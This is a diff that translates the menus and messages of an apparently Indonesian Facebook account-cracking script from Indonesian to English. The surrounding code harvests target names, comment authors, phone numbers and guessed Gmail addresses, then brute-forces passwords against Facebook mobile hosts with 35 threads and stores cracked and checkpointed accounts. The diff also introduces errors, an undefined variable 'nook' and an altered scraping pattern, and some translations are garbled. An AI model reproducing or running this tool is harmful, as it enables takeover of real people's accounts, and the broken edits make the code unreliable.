@@ -96,7 +96,7 @@ def menu_utama():
                                                          
                           
 {M}⚔═══════════════════════☠════════════════════════⚔{P}''')
-	nopo = input(f"\n[{H}1{P}] Pencarian\n[{H}2{P}] Komentar\n[{H}3{P}] Nomor\n[{H}4{P}] Email\n[{H}5{P}] Random\n[{H}6{P}] File\n[{H}7{P}] Cek hasil\n[{H}?{P}] Pilih : "); print()
+	nopo = input(f"\n[{H}1{P}] Search\n[{H}2{P}] comment\n[{H}3{P}] Number\n[{H}4{P}] Email\n[{H}5{P}] Random\n[{H}6{P}] File\n[{H}7{P}] Check result\n[{H}?{P}] select : "); print()
 	if nopo == "1": Cari_Nama().apa_nama()
 	if nopo == "2": dump_komen()
 	if nopo == "3": dump_nomor()
@@ -109,37 +109,37 @@ def menu_utama():
 ###---[ CEK HASIL CRACK ]---###
 def cek_hasil():
 	no, nox, nom = 0, 0, []
-	print(f"[{H}1{P}] Cek hasil ok")
-	print(f"[{H}2{P}] Cek hasil cp")
-	print(f"[{H}3{P}] Batalkan proses")
-	one = input(f'[{H}?{P}] pilih : '); print()
+	print(f"[{H}1{P}] Check the result ok")
+	print(f"[{H}2{P}] Check the result cp")
+	print(f"[{H}3{P}] Cancel the process")
+	one = input(f'[{H}?{P}] select : '); print()
 	if one in ['1','01']:
 		try:ok = os.listdir('/sdcard/FBCrack OK')
-		except: exit(f"[{M}!{P}] Tak hasil")
+		except: exit(f"[{M}!{P}] No results")
 		for x in ok:
 			if 'OK' in str(x):
 				nom.append(x); no+=1
 				try: jum = open('/sdcard/FBCrack OK/'+x,'r').readlines()
 				except: jum = ['']
-				print(f'[{H}{no}{P}] {x} | {H}{len(jum)} {P}akun')	
-		abc = input(f'[{H}?{P}] Nomor file : '); print()
+				print(f'[{H}{no}{P}] {x} | {H}{len(jum)} {P}account')	
+		abc = input(f'[{H}?{P}] Number file : '); print()
 		file = nom[int(abc)-1]
 		try:buka = open('/sdcard/FBCrack OK/'+file,'r').read().splitlines()
-		except: exit(f"[{M}!{P}] File tak ada hasil ok")
-		for data in buka: nox += 1; print(f"[{H}{nox}{P}] {data}")	
+		except: exit(f"[{M}!{P}] The file has no results, okay")
+		for data in buka: nox += 1; print(f"[{H}{nook}] {data}")	
 	elif one in ['2','02']:
 		try:ok = os.listdir('/sdcard/FBCrack CP')
-		except:sys.exit(f"[{M}!{P}] Tak hasil")
+		except:sys.exit(f"[{M}!{P}] No results")
 		for x in ok:
 			if 'CP' in str(x):
 				nom.append(x); no+=1
 				try: jum= open('/sdcard/FBCrack CP/'+x,'r').readlines()
 				except: jum = ['']
-				print(f'[{K}{no}{P}] {x} | {K}{len(jum)} {P}akun')	
-		abc = input(f'[{K}?{P}] Nomor file : '); print()
+				print(f'[{K}{no}{P}] {x} | {K}{len(jum)} {P}account')	
+		abc = input(f'[{K}?{P}] Number file : '); print()
 		file = nom[int(abc)-1]
 		try:buka = open('/sdcard/FBCrack CP/'+file,'r').read().splitlines()
-		except: exit(f"[{M}!{P}] File tak ada hasil cp")
+		except: exit(f"[{M}!{P}] The file has no result, cp")
 		for data in buka: nox += 1; print(f"[{K}{nox}{P}] {data}")	
 	else: menu_utama()
 	
@@ -150,7 +150,7 @@ class Cari_Nama:
 		self.sudah = []
 	
 	def apa_nama(self):
-		hackerliar = input(f"[{H}!{P}] Sebutkan satu nama saja\n[{H}?{P}] nama  : ")
+		hackerliar = input(f"[{H}!{P}] just mention one name\n[{H}?{P}] name  : ")
 		self.limit = input(f"[{H}!{P}] limit : "); print()
 		self.daftar.append(hackerliar)
 		while True:
@@ -171,7 +171,7 @@ class Cari_Nama:
 				result = ['|'.join(pair) for pair in zip(B, A)]
 				dump.extend(t for t in result if t not in dump)
 				for s in result: print(f"\r[{H}!{P}] {s.split('|')[0]} | {len(dump)} ", flush=True, end="")
-				self.url=re.findall('"see_more_pager",href:"(.*?)",',link)[0]
+				self.url=re.findall('"see_more_page",href:"(.*?)",',link)[0]
 			except Exception as e: break
 			
 ### --- [ TANYA METODE ] --- ###
@@ -179,7 +179,7 @@ def pilih_metode(password):
 	global ok, cp
 	fb = [z for z in random.sample(dump, len(dump))]; dump.clear(); dump.extend(fb); daftar_url = ['free.facebook.com', 'm.prod.facebook.com', 'free.prod.facebook.com']; nomor = 1; me = []
 	for url in daftar_url: print(f"[{H}{nomor}{P}] {url}"); nomor += 1
-	no_url = input(f"[{H}?{P}] Pilih : "); print()
+	no_url = input(f"[{H}?{P}] Select : "); print()
 	try: main_url = daftar_url[int(no_url)-1]
 	except: main_url = "free.facebook.com"	
 	if password:
@@ -188,20 +188,20 @@ def pilih_metode(password):
 	else:
 		for data_akun in dump:
 			me.append(buat_data(data_akun))
-	print(f"\r[{H}!{P}] akun ok : {H}OK{P}/{hari_save}")
-	print(f"[{H}!{P}] akun cp : {K}CP{P}/{hari_save}\n")	
+	print(f"\r[{H}!{P}] account ok : {H}OK{P}/{hari_save}")
+	print(f"[{H}!{P}] account cp : {K}CP{P}/{hari_save}\n")	
 	with ThreadPoolExecutor (max_workers=35) as fb:
 		for data_akun in me:
 			user, sandi = data_akun.split('|')
 			fb.submit(metode_log, user, sandi.split(','), main_url)
-	print(f"\r[{H}!{P}] Hasil crack ok:{H}{ok}{P} cp:{K}{cp}{P} dari {H}{len(dump)}{P} dump")
+	print(f"\r[{H}!{P}] result crack ok:{H}{ok}{P} cp:{K}{cp}{P} from {H}{len(dump)}{P} dump")
 
 ### --- [ DUMP KOMEN 2024 ] --- ###
 def dump_komen():
 	next = 0
-	print(f"[{H}!{P}] Masukan link target")
+	print(f"[{H}!{P}] input link target")
 	target = input(f"[{H}?{P}] target : ")
-	print(f"[{H}!{P}] Tekan ctrl c untuk stop\n")
+	print(f"[{H}!{P}] Press ctrl+c to stop\n")
 	if "app=fbcrack" in target: main_link = target.replace("www", "x").split("?app=fbcrack")[0]
 	else: main_link = target.replace("www", "x")
 	while True:
@@ -219,7 +219,7 @@ def dump_komen():
 	
 ### --- [ DUMP NOMOR ] --- ###
 def dump_nomor():
-	print(f"[{H}!{P}] Masukan digit depan ({K}0831{P})")
+	print(f"[{H}!{P}] Enter the front digit ({K}0831{P})")
 	depan = input(f"[{H}?{P}] digit : "); print()
 	while True:
 		nomor = "{}-{}-{}".format(depan, rr(1111,9999), rr(1111,9999))
@@ -230,9 +230,9 @@ def dump_nomor():
 
 ### --- [ DUMP EMAIL ] --- ###
 def dump_email():
-	print(f"[{H}!{P}] Masukan nama target")
+	print(f"[{H}!{P}] Enter the target name")
 	nama = input(f"[{H}?{P}] Target : ").lower(); print()
-	if len(nama)<3: exit(f"[{M}!{P}] Nama harus 3 kata")
+	if len(nama)<3: exit(f"[{M}!{P}] The name must be 3 words")
 	while True:
 		format = rc([f"{nama}{rr(1,9999)}", f"{nama}.{rr(1,9999)}", f"{nama}{rr(1,31)}{rr(1,12)}{rr(1990,2024)}", f"{nama}{rr(1,9999)}.{rr(1,9999)}", f"{nama}.{rr(1,9999)}.{rr(1,9999)}", f"{rr(1,9999)}{nama}", f"{rr(1,9999)}.{nama}"])
 		result = f"{format}@gmail.com|{nama}"
@@ -243,7 +243,7 @@ def dump_email():
 			
 ### --- [ DUMP RANDOM ] --- ###
 def dump_random():
-	print(f"[{H}!{P}] Masukan target id akun")
+	print(f"[{H}!{P}] Enter the account I'd")
 	depan = input(f"[{H}?{P}] Target : ")[:-5]; print()
 	while True:
 		nomor = "{}{}".format(depan, rr(11111,99999))
@@ -254,13 +254,13 @@ def dump_random():
 
 ### --- [ DUMP FILE ] --- ###
 def dump_file():
-	print(f"[{H}!{P}] Masukan nama file")
+	print(f"[{H}!{P}] Enter name of file")
 	depan = input(f"[{H}?{P}] input : "); print()
 	try:
 		for nomor in open(depan, "r").read().splitlines():
 			try: dump.extend(open(depan, "r").read().splitlines()); print(f"\r[{H}!{P}] {nomor.split('|')[0]} | {len(dump)} ", flush=True, end=""); break
-			except: exit("[!] Format file salah")
-	except FileNotFoundError: exit("[!] File tak ada")
+			except: exit("[!] Format file Wrong")
+	except FileNotFoundError: exit("[!] The file doesn't exist")
 	print('\n\r     '); pilih_metode('')
 
 ### --- [ METODE REGULAR ] --- ###
